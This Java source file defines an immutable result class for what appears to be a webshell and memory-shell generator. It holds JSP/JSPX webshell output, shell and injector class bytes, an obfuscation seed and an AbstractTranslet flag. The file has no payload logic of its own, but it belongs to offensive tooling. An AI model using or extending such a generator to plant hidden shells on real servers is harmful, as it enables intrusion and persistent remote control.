package org.leo.jmg.generation;

import org.leo.jmg.ServletNamespace;
import org.leo.jmg.TargetJavaVersion;
import org.leo.jmg.TransportProtocol;

/**
 * 一次生成执行的不可变结果。
 *
 * <p>结果对象拥有最终文本、派生类名和各阶段字节码。</p>
 */
public final class GenerationResult {

    private final GenerationPlan.ArtifactKind artifactKind;
    private final String content;
    private final String coreClassName;
    private final String shellClassName;
    private final String injectorClassName;
    private final String urlPattern;
    private final byte[] coreClassBytes;
    private final byte[] shellClassBytes;
    private final byte[] injectorClassBytes;
    private final TransportProtocol protocol;
    private final TargetJavaVersion targetJavaVersion;
    private final ServletNamespace servletNamespace;
    private final long obfuscationSeed;
    private final boolean abstractTranslet;

    private GenerationResult(GenerationPlan plan,
                             String content,
                             String shellClassName,
                             String injectorClassName,
                             String urlPattern,
                             byte[] coreClassBytes,
                             byte[] shellClassBytes,
                             byte[] injectorClassBytes,
                             boolean abstractTranslet) {
        if (plan == null) {
            throw new IllegalArgumentException("GenerationPlan 不能为空");
        }
        if (content == null) {
            throw new IllegalArgumentException("生成内容不能为空");
        }
        GenerationRequest request = plan.getRequest();
        this.artifactKind = plan.getArtifactKind();
        this.content = content;
        this.coreClassName = request.getCoreClassName();
        this.shellClassName = shellClassName;
        this.injectorClassName = injectorClassName;
        this.urlPattern = urlPattern;
        this.coreClassBytes = copyRequired(coreClassBytes, "coreClassBytes");
        boolean injector = plan.getArtifactKind() == GenerationPlan.ArtifactKind.INJECTOR;
        this.shellClassBytes = injector
                ? copyRequired(shellClassBytes, "shellClassBytes")
                : copy(shellClassBytes);
        this.injectorClassBytes = injector
                ? copyRequired(injectorClassBytes, "injectorClassBytes")
                : copy(injectorClassBytes);
        this.protocol = request.getProtocol();
        this.targetJavaVersion = request.getTargetJavaVersion();
        this.servletNamespace = request.getEffectiveServletNamespace();
        this.obfuscationSeed = request.getObfuscationSeed();
        this.abstractTranslet = abstractTranslet;
    }

    public static GenerationResult forWebShell(GenerationPlan plan,
                                               String content,
                                               byte[] coreClassBytes) {
        if (plan == null
                || (plan.getArtifactKind() != GenerationPlan.ArtifactKind.JSP
                && plan.getArtifactKind() != GenerationPlan.ArtifactKind.JSPX)) {
            throw new IllegalArgumentException("WebShell 结果需要 JSP 或 JSPX 生成计划");
        }
        return new GenerationResult(
                plan, content, null, null, plan.getRequest().getUrlPattern(), coreClassBytes, null, null, false);
    }

    public static GenerationResult forInjector(GenerationPlan plan,
                                               GenerationWorkspace workspace,
                                               String content) {
        if (plan == null
                || plan.getArtifactKind() != GenerationPlan.ArtifactKind.INJECTOR) {
            throw new IllegalArgumentException("Injector 结果需要 INJECTOR 生成计划");
        }
        if (workspace == null) {
            throw new IllegalArgumentException("GenerationWorkspace 不能为空");
        }
        return new GenerationResult(
                plan,
                content,
                workspace.getShellClassName(),
                workspace.getInjectorClassName(),
                workspace.getEffectiveUrlPattern(),
                workspace.getCoreClassBytes(),
                workspace.getShellClassBytes(),
                workspace.getInjectorClassBytes(),
                workspace.isAbstractTranslet());
    }

    public GenerationPlan.ArtifactKind getArtifactKind() {
        return artifactKind;
    }

    public String getContent() {
        return content;
    }

    public String getCoreClassName() {
        return coreClassName;
    }

    public String getShellClassName() {
        return shellClassName;
    }

    public String getInjectorClassName() {
        return injectorClassName;
    }

    public String getUrlPattern() {
        return urlPattern;
    }

    public byte[] getCoreClassBytes() {
        return copy(coreClassBytes);
    }

    public byte[] getShellClassBytes() {
        return copy(shellClassBytes);
    }

    public byte[] getInjectorClassBytes() {
        return copy(injectorClassBytes);
    }

    public TransportProtocol getProtocol() {
        return protocol;
    }

    public TargetJavaVersion getTargetJavaVersion() {
        return targetJavaVersion;
    }

    public ServletNamespace getServletNamespace() {
        return servletNamespace;
    }

    public long getObfuscationSeed() {
        return obfuscationSeed;
    }

    public boolean isAbstractTranslet() {
        return abstractTranslet;
    }

    private static byte[] copyRequired(byte[] value, String name) {
        if (value == null) {
            throw new IllegalArgumentException(name + " 不能为空");
        }
        return value.clone();
    }

    private static byte[] copy(byte[] value) {
        return value == null ? null : value.clone();
    }
}
